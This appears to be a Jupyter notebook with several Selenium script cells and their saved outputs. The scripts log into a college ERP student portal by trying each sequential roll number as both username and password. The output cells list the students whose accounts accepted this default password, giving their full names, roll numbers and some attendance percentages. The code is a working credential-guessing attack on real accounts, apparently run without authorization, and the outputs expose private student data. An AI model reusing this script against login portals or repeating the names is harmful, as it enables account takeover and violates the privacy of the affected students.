# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from time import sleep
driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
def bot(username,password):
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    try :
        attendence = driver.find_element_by_id("ctl00_cpStud_lblTotalPercentage")
        print(username , "percentage = "+attendence.text)
    except :
        print(username,"password is changed")
    driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
    

for i in range(37,65):
    if i <= 9 :
        roll = "0"+str(i)
    else :
        roll = str(i)
    username = "20JR1A44"+roll 
    password = "20JR1A44"+roll 
    bot(username,password)

driver.close()
# Out:
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/732821872.py:5: DeprecationWarning: executable_path has been deprecated, please pass in a Service object
#   driver = webdriver.Chrome("chromedriver.exe")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/732821872.py:8: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   loginbox = driver.find_element_by_id("txtUserName")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/732821872.py:12: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   passwordbox=driver.find_element_by_id("txtPassword")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/732821872.py:17: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   attendence = driver.find_element_by_id("ctl00_cpStud_lblTotalPercentage")
# 20JR1A4437 percentage = 93.60 %
# 20JR1A4438 password is changed
# 20JR1A4439 password is changed
# 20JR1A4440 percentage = 99.42 %
# 20JR1A4441 percentage = 87.79 %
# 20JR1A4442 password is changed
# 20JR1A4443 password is changed
# 20JR1A4444 percentage = 88.95 %
# 20JR1A4445 percentage = 81.98 %
# 20JR1A4446 percentage = 86.63 %
# 20JR1A4447 password is changed
# 20JR1A4448 percentage = 95.35 %
# 20JR1A4449 percentage = 81.40 %
# 20JR1A4450 percentage = 80.81 %
# 20JR1A4451 percentage = 84.30 %
# 20JR1A4452 percentage = 93.60 %
# 20JR1A4453 percentage = 86.05 %
# 20JR1A4454 percentage = 99.42 %
# 20JR1A4455 percentage = 89.53 %
# 20JR1A4456 percentage = 90.70 %
# 20JR1A4457 percentage = 97.09 %
# 20JR1A4458 percentage = 88.37 %
# 20JR1A4459 password is changed
# 20JR1A4460 password is changed
# 20JR1A4461 percentage = 86.63 %
# 20JR1A4462 password is changed
# 20JR1A4463 password is changed
# 20JR1A4464 percentage = 89.53 %

# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from time import sleep
driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
def bot(username,password):
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    try :
        name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
        print(name.text)
    except :
        print(username,"password is changed")
    driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
    

for i in range(37,65):
    if i <= 9 :
        roll = "0"+str(i)
    else :
        roll = str(i)
    username = "20JR1A44"+roll 
    password = "20JR1A44"+roll 
    bot(username,password)

driver.close()
# Out:
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1333946820.py:5: DeprecationWarning: executable_path has been deprecated, please pass in a Service object
#   driver = webdriver.Chrome("chromedriver.exe")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1333946820.py:8: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   loginbox = driver.find_element_by_id("txtUserName")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1333946820.py:12: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   passwordbox=driver.find_element_by_id("txtPassword")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1333946820.py:17: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
# WELCOME BARAM SIVA RAMI REDDY ( 20JR1A4437 )
# 20JR1A4438 password is changed
# 20JR1A4439 password is changed
# WELCOME BOTTLA BALA KRISHNA REDDY ( 20JR1A4440 )
# WELCOME DASARI MUKESH ( 20JR1A4441 )
# 20JR1A4442 password is changed
# 20JR1A4443 password is changed
# WELCOME GOGIREDDY VENKATA REDDY ( 20JR1A4444 )
# WELCOME GUDIBANDI NAGENDRA REDDY ( 20JR1A4445 )
# WELCOME GUMMADIDALA SATYANARAYANA ( 20JR1A4446 )
# 20JR1A4447 password is changed
# 20JR1A4448 password is changed
# ---------------------------------------------------------------------------
# WebDriverException                        Traceback (most recent call last)
# ~\AppData\Local\Temp/ipykernel_3228/1333946820.py in <module>
#      29     username = "20JR1A44"+roll
#      30     password = "20JR1A44"+roll
# ---> 31     bot(username,password)
#      32
#      33 driver.close()
#
# ~\AppData\Local\Temp/ipykernel_3228/1333946820.py in bot(username, password)
#      19     except :
#      20         print(username,"password is changed")
# ---> 21     driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
#      22
#      23
#
# c:\Users\hp\AppData\Local\Programs\Python\Python310\lib\site-packages\selenium\webdriver\remote\webdriver.py in get(self, url)
#     434         Loads a web page in the current browser session.
#     435         """
# --> 436         self.execute(Command.GET, {'url': url})
#     437
#     438     @property
#
# c:\Users\hp\AppData\Local\Programs\Python\Python310\lib\site-packages\selenium\webdriver\remote\webdriver.py in execute(self, driver_command, params)
#     422         response = self.command_executor.execute(driver_command, params)
#     423         if response:
# --> 424             self.error_handler.check_response(response)
#     425             response['value'] = self._unwrap_value(
#     426                 response.get('value', None))
#
# c:\Users\hp\AppData\Local\Programs\Python\Python310\lib\site-packages\selenium\webdriver\remote\errorhandler.py in check_response(self, response)
#     245                 alert_text = value['alert'].get('text')
#     246             raise exception_class(message, screen, stacktrace, alert_text)  # type: ignore[call-arg]  # mypy is not smart enough here
# --> 247         raise exception_class(message, screen, stacktrace)
#     248
#     249     def _value_or_default(self, obj: Mapping[_KT, _VT], key: _KT, default: _VT) -> _VT:
#
# WebDriverException: Message: chrome not reachable
#   (Session info: chrome=96.0.4664.110)
# Stacktrace:
# Backtrace:
# 	Ordinal0 [0x00DE6903+2517251]
# 	Ordinal0 [0x00D7F8E1+2095329]
# 	Ordinal0 [0x00C82710+1058576]
# 	Ordinal0 [0x00C776A4+1013412]
# 	Ordinal0 [0x00C77EA8+1015464]
# 	Ordinal0 [0x00C79695+1021589]
# 	Ordinal0 [0x00C73686+996998]
# 	Ordinal0 [0x00C83A60+1063520]
# 	Ordinal0 [0x00CD5382+1397634]
# 	Ordinal0 [0x00CC639B+1336219]
# 	Ordinal0 [0x00CA27A7+1189799]
# 	Ordinal0 [0x00CA3609+1193481]
# 	GetHandleVerifier [0x00F75904+1577972]
# 	GetHandleVerifier [0x01020B97+2279047]
# 	GetHandleVerifier [0x00E76D09+534521]
# 	GetHandleVerifier [0x00E75DB9+530601]
# 	Ordinal0 [0x00D84FF9+2117625]
# 	Ordinal0 [0x00D898A8+2136232]
# 	Ordinal0 [0x00D899E2+2136546]
# 	Ordinal0 [0x00D93541+2176321]
# 	BaseThreadInitThunk [0x7648FA29+25]
# 	RtlGetAppContainerNamedObjectPath [0x771C7A9E+286]
# 	RtlGetAppContainerNamedObjectPath [0x771C7A6E+238]

# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from time import sleep
driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
def bot(username,password):
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    try :
        name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
        print(name.text)
    except :
        print(username,"password is changed")
    driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
    

for i in range(1,65):
    if i <= 9 :
        roll = "0"+str(i)
    else :
        roll = str(i)
    username = "20JR1A43"+roll 
    password = "20JR1A43"+roll 
    bot(username,password)

driver.close()
# Out:
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1386590946.py:5: DeprecationWarning: executable_path has been deprecated, please pass in a Service object
#   driver = webdriver.Chrome("chromedriver.exe")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1386590946.py:8: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   loginbox = driver.find_element_by_id("txtUserName")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1386590946.py:12: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   passwordbox=driver.find_element_by_id("txtPassword")
# C:\Users\hp\AppData\Local\Temp/ipykernel_3228/1386590946.py:17: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
# WELCOME AKURATHI SUSHMA ( 20JR1A4301 )
# WELCOME CHENNAM HEMA SIRISHA ( 20JR1A4302 )
# WELCOME CHILAKA KOMALI ( 20JR1A4303 )
# WELCOME CHIMALADINNE JHANSI ( 20JR1A4304 )
# WELCOME DARIPALLI BHAVANA ALEKHYASAI ( 20JR1A4305 )
# WELCOME DARSI GANGOTHRI ( 20JR1A4306 )
# WELCOME EMANI BHARGAVI ( 20JR1A4307 )
# 20JR1A4308 password is changed
# WELCOME GUDIPATI PAVANI ( 20JR1A4309 )
# 20JR1A4310 password is changed
# WELCOME KALADURGI RAMYA SRI ( 20JR1A4311 )
# 20JR1A4312 password is changed
# WELCOME KANDUKURI GAYATHRI ( 20JR1A4313 )
# WELCOME KANDULA HEMA LATHA ( 20JR1A4314 )
# WELCOME KORNEPATI SMILY ( 20JR1A4315 )
# 20JR1A4316 password is changed
# WELCOME LAVU SUMA SRI ( 20JR1A4317 )
# WELCOME MANDAVA YASASWI ( 20JR1A4318 )
# 20JR1A4319 password is changed
# WELCOME NARNE PAVANI ( 20JR1A4320 )
# WELCOME NAZNEEN SULTANA BAIG ( 20JR1A4321 )
# WELCOME PALETI NIKHITHA ( 20JR1A4322 )
# 20JR1A4323 password is changed
# WELCOME SHAIK AFRIN ( 20JR1A4324 )
# WELCOME SREE VIDHYA MADDINENI ( 20JR1A4325 )
# WELCOME TALATHOTI RAMYA SRI ( 20JR1A4326 )
# WELCOME TELAPROLU SAI SRI HARSHINI ( 20JR1A4327 )
# WELCOME THOKALA MINI ROSE ( 20JR1A4328 )
# WELCOME UNNAVA CHANDANA ( 20JR1A4329 )
# WELCOME UPPUTURI ASRITHA ( 20JR1A4330 )
# WELCOME VALLEPU SOWJANYA ( 20JR1A4331 )
# WELCOME YADDANAPUDI CHARITHA SREE ( 20JR1A4332 )
# WELCOME YERRA SINDHU ( 20JR1A4333 )
# 20JR1A4334 password is changed
# WELCOME ANUMALASETTY NAGASEKHARA MANIKUMAR ( 20JR1A4335 )
# WELCOME BOLISETTY AKHIL ( 20JR1A4336 )
# WELCOME BONDU SATHISH CHANDRAN ( 20JR1A4337 )
# WELCOME BORRA GOWTHAM CHOWDARY ( 20JR1A4338 )
# WELCOME BORUGADDA SANDEEP ( 20JR1A4339 )
# WELCOME DOPPALAPUDI HEMANTH SUKUMAR ( 20JR1A4340 )
# WELCOME GUNDA SANJAY ( 20JR1A4341 )
# WELCOME IDAPALAPATI KARTHEEK ( 20JR1A4342 )
# WELCOME JAYA PRAKASH KATTA ( 20JR1A4343 )
# 20JR1A4344 password is changed
# WELCOME KANTHETI PEDDA MANIKANTA ( 20JR1A4345 )
# 20JR1A4346 password is changed
# WELCOME KATAM VENKATA VISHNU ( 20JR1A4347 )
# WELCOME KETHINENI RAM KUMAR ( 20JR1A4348 )
# WELCOME MACHAVARAPU SAI CHANDU ( 20JR1A4349 )
# 20JR1A4350 password is changed
# WELCOME MEESALA SASI KIRAN ( 20JR1A4351 )
# WELCOME MUSTIPALLI PAVAN ( 20JR1A4352 )
# WELCOME NUKAVARAPU SUMANTH ( 20JR1A4353 )
# WELCOME PAILA AKHILESH ( 20JR1A4354 )
# WELCOME PASUMARTHI RAKESH ROSHAN PAUL ( 20JR1A4355 )
# WELCOME PATCHALA SAINATH ( 20JR1A4356 )
# 20JR1A4357 password is changed
# WELCOME PUNATI DHANUSH CHOWDARY ( 20JR1A4358 )
# 20JR1A4359 password is changed
# WELCOME RAMISETTY P V S R SATHWIK ( 20JR1A4360 )
# 20JR1A4361 password is changed
# WELCOME SHAIK BORRA SHOHEB AKTHAR ( 20JR1A4362 )
# WELCOME SHAIK MUNEER ( 20JR1A4363 )
# WELCOME SINGAMSETTY NAGA SAI DURGESH ( 20JR1A4364 )

# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from time import sleep
driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
def bot(username,password):
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    try :
        name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
        print(name.text)
    except :
        print(username,"password is changed")
    driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
    

for i in range(1,65):
    if i <= 9 :
        roll = "0"+str(i)
    else :
        roll = str(i)
    username = "20JR1A43"+roll 
    password = "20JR1A43"+roll 
    bot(username,password)

driver.close()
# Out:
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/1386590946.py:5: DeprecationWarning: executable_path has been deprecated, please pass in a Service object
#   driver = webdriver.Chrome("chromedriver.exe")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/1386590946.py:8: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   loginbox = driver.find_element_by_id("txtUserName")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/1386590946.py:12: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   passwordbox=driver.find_element_by_id("txtPassword")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/1386590946.py:17: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
# WELCOME AKURATHI SUSHMA ( 20JR1A4301 )
# WELCOME CHENNAM HEMA SIRISHA ( 20JR1A4302 )
# WELCOME CHILAKA KOMALI ( 20JR1A4303 )
# WELCOME CHIMALADINNE JHANSI ( 20JR1A4304 )
# WELCOME DARIPALLI BHAVANA ALEKHYASAI ( 20JR1A4305 )
# WELCOME DARSI GANGOTHRI ( 20JR1A4306 )
# WELCOME EMANI BHARGAVI ( 20JR1A4307 )
# 20JR1A4308 password is changed
# WELCOME GUDIPATI PAVANI ( 20JR1A4309 )
# 20JR1A4310 password is changed
# WELCOME KALADURGI RAMYA SRI ( 20JR1A4311 )
# 20JR1A4312 password is changed
# WELCOME KANDUKURI GAYATHRI ( 20JR1A4313 )
# WELCOME KANDULA HEMA LATHA ( 20JR1A4314 )
# WELCOME KORNEPATI SMILY ( 20JR1A4315 )
# 20JR1A4316 password is changed
# WELCOME LAVU SUMA SRI ( 20JR1A4317 )
# WELCOME MANDAVA YASASWI ( 20JR1A4318 )
# 20JR1A4319 password is changed
# WELCOME NARNE PAVANI ( 20JR1A4320 )
# WELCOME NAZNEEN SULTANA BAIG ( 20JR1A4321 )
# WELCOME PALETI NIKHITHA ( 20JR1A4322 )
# 20JR1A4323 password is changed
# WELCOME SHAIK AFRIN ( 20JR1A4324 )
# WELCOME SREE VIDHYA MADDINENI ( 20JR1A4325 )
# WELCOME TALATHOTI RAMYA SRI ( 20JR1A4326 )
# WELCOME TELAPROLU SAI SRI HARSHINI ( 20JR1A4327 )
# WELCOME THOKALA MINI ROSE ( 20JR1A4328 )
# WELCOME UNNAVA CHANDANA ( 20JR1A4329 )
# WELCOME UPPUTURI ASRITHA ( 20JR1A4330 )
# WELCOME VALLEPU SOWJANYA ( 20JR1A4331 )
# WELCOME YADDANAPUDI CHARITHA SREE ( 20JR1A4332 )
# WELCOME YERRA SINDHU ( 20JR1A4333 )
# 20JR1A4334 password is changed
# WELCOME ANUMALASETTY NAGASEKHARA MANIKUMAR ( 20JR1A4335 )
# WELCOME BOLISETTY AKHIL ( 20JR1A4336 )
# WELCOME BONDU SATHISH CHANDRAN ( 20JR1A4337 )
# WELCOME BORRA GOWTHAM CHOWDARY ( 20JR1A4338 )
# WELCOME BORUGADDA SANDEEP ( 20JR1A4339 )
# WELCOME DOPPALAPUDI HEMANTH SUKUMAR ( 20JR1A4340 )
# WELCOME GUNDA SANJAY ( 20JR1A4341 )
# WELCOME IDAPALAPATI KARTHEEK ( 20JR1A4342 )
# WELCOME JAYA PRAKASH KATTA ( 20JR1A4343 )
# 20JR1A4344 password is changed
# WELCOME KANTHETI PEDDA MANIKANTA ( 20JR1A4345 )
# 20JR1A4346 password is changed
# WELCOME KATAM VENKATA VISHNU ( 20JR1A4347 )
# WELCOME KETHINENI RAM KUMAR ( 20JR1A4348 )
# WELCOME MACHAVARAPU SAI CHANDU ( 20JR1A4349 )
# 20JR1A4350 password is changed
# WELCOME MEESALA SASI KIRAN ( 20JR1A4351 )
# WELCOME MUSTIPALLI PAVAN ( 20JR1A4352 )
# WELCOME NUKAVARAPU SUMANTH ( 20JR1A4353 )
# WELCOME PAILA AKHILESH ( 20JR1A4354 )
# WELCOME PASUMARTHI RAKESH ROSHAN PAUL ( 20JR1A4355 )
# WELCOME PATCHALA SAINATH ( 20JR1A4356 )
# 20JR1A4357 password is changed
# WELCOME PUNATI DHANUSH CHOWDARY ( 20JR1A4358 )
# 20JR1A4359 password is changed
# WELCOME RAMISETTY P V S R SATHWIK ( 20JR1A4360 )
# 20JR1A4361 password is changed
# WELCOME SHAIK BORRA SHOHEB AKTHAR ( 20JR1A4362 )
# WELCOME SHAIK MUNEER ( 20JR1A4363 )
# WELCOME SINGAMSETTY NAGA SAI DURGESH ( 20JR1A4364 )

# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

from time import sleep
driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
def bot(username,password):
    loginbox = driver.find_element_by_id("txtUserName")
    loginbox.clear()
    loginbox.send_keys(username)
    loginbox.send_keys(Keys.RETURN)
    passwordbox=driver.find_element_by_id("txtPassword")
    passwordbox.clear()
    passwordbox.send_keys(password)
    passwordbox.send_keys(Keys.RETURN)
    try :
        name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
        print(name.text)
    except :
        print(username,"password is changed")
    driver.get("https://kitsgunturerp.com/BeeSERP/Login.aspx")
    

for i in range(1,65):
    if i <= 9 :
        roll = "0"+str(i)
    else :
        roll = str(i)
    username = "20JR1A44"+roll 
    password = "20JR1A44"+roll 
    bot(username,password)

driver.close()
# Out:
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/320800206.py:5: DeprecationWarning: executable_path has been deprecated, please pass in a Service object
#   driver = webdriver.Chrome("chromedriver.exe")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/320800206.py:8: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   loginbox = driver.find_element_by_id("txtUserName")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/320800206.py:12: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   passwordbox=driver.find_element_by_id("txtPassword")
# C:\Users\hp\AppData\Local\Temp/ipykernel_13680/320800206.py:17: DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead
#   name = driver.find_element_by_id("ctl00_cpHeader_ucStud_lblStudentName")
# 20JR1A4401 password is changed
# WELCOME AVULURI VENKATA MADHAVI ( 20JR1A4402 )
# WELCOME BHAVYA SRI AAKURAATHI ( 20JR1A4403 )
# WELCOME BUDDA SIVA PARVATHI ( 20JR1A4404 )
# WELCOME CHANDU BHUVANESWARI ( 20JR1A4405 )
# WELCOME CHELLA SRESHTA ( 20JR1A4406 )
# WELCOME CHETLAPALLE SAIDEEKSHITHA ( 20JR1A4407 )
# WELCOME CHEVULA CHAITANYA SRI ( 20JR1A4408 )
# WELCOME CHILAKA ANUPAMA ( 20JR1A4409 )
# WELCOME DEVARAPALLI PRABHODA ( 20JR1A4410 )
# WELCOME DUPATI JAYASREE ( 20JR1A4411 )
# WELCOME GALI MANIDEEPTHI ( 20JR1A4412 )
# WELCOME GUDIVADA NAGA SAI DHANALAKSHMI ( 20JR1A4413 )
# WELCOME KANDULA HARI PRIYA ( 20JR1A4414 )
# 20JR1A4415 password is changed
# WELCOME KOTTAMASU NAGA VINAYA SREE ( 20JR1A4416 )
# WELCOME KOYA HEMA SATYA SRI ( 20JR1A4417 )
# WELCOME KURRA PUJITHA KRISHNA PRIYA ( 20JR1A4418 )
# WELCOME LAGHUMAVARAPU KOMALI ( 20JR1A4419 )
# WELCOME MARRIKANTI PRAISY RIVRITHA ( 20JR1A4420 )
# WELCOME MATTUKOYYA TULASI ( 20JR1A4421 )
# WELCOME MUTCHINTALA RENUKA ( 20JR1A4422 )
# 20JR1A4423 password is changed
# WELCOME NARNE VENKATA NAGA LAKSHMI ( 20JR1A4424 )
# WELCOME PATALAM ASFIYA ( 20JR1A4425 )
# WELCOME POTTURI LAKSHMI SIVA NAGA JYOTHI ( 20JR1A4426 )
# WELCOME PUJITHA GANGURU ( 20JR1A4427 )
# WELCOME PURETI DIVYASRI ( 20JR1A4428 )
# WELCOME PUVVULA SARAYU ( 20JR1A4429 )
# WELCOME RAGI KAVITHA ( 20JR1A4430 )
# WELCOME SAKHAMURI LATHA SRI ( 20JR1A4431 )
# WELCOME SUDIREDDY PRATHYUSHA ( 20JR1A4432 )
# WELCOME TUMMALA TANUJA ( 20JR1A4433 )
# WELCOME TUMU DHANALAKSHMI ( 20JR1A4434 )
# 20JR1A4435 password is changed
# 20JR1A4436 password is changed
# WELCOME BARAM SIVA RAMI REDDY ( 20JR1A4437 )
# 20JR1A4438 password is changed
# 20JR1A4439 password is changed
# WELCOME BOTTLA BALA KRISHNA REDDY ( 20JR1A4440 )
# WELCOME DASARI MUKESH ( 20JR1A4441 )
# 20JR1A4442 password is changed
# 20JR1A4443 password is changed
# WELCOME GOGIREDDY VENKATA REDDY ( 20JR1A4444 )
# WELCOME GUDIBANDI NAGENDRA REDDY ( 20JR1A4445 )
# WELCOME GUMMADIDALA SATYANARAYANA ( 20JR1A4446 )
# 20JR1A4447 password is changed
# WELCOME KARASALA AMOSU ( 20JR1A4448 )
# WELCOME KONA RAM SUDHEER ( 20JR1A4449 )
# WELCOME LANKA YUGANDHAR RAVI KIRAN ( 20JR1A4450 )
# WELCOME MADAPAKULA VENKATA ANIL ( 20JR1A4451 )
# WELCOME MAJETI KRISHNA CHAITANYA ( 20JR1A4452 )
# WELCOME MANEEDI NAGAKIRAN ( 20JR1A4453 )
# WELCOME MANGULURI NAVEEN CHOWDARY ( 20JR1A4454 )
# WELCOME MUTHYALA ESWAR KUMAR ( 20JR1A4455 )
# WELCOME PALEPOGU RAKESH ( 20JR1A4456 )
# WELCOME PINNIKA NAVEEN ( 20JR1A4457 )
# WELCOME RACHAKONDA SANJEEV DEV ( 20JR1A4458 )
# 20JR1A4459 password is changed
# 20JR1A4460 password is changed
# WELCOME THADIKONDA SHANMUKH ( 20JR1A4461 )
# 20JR1A4462 password is changed
# 20JR1A4463 password is changed
# WELCOME THOTA JAYA KRISHNA ( 20JR1A4464 )
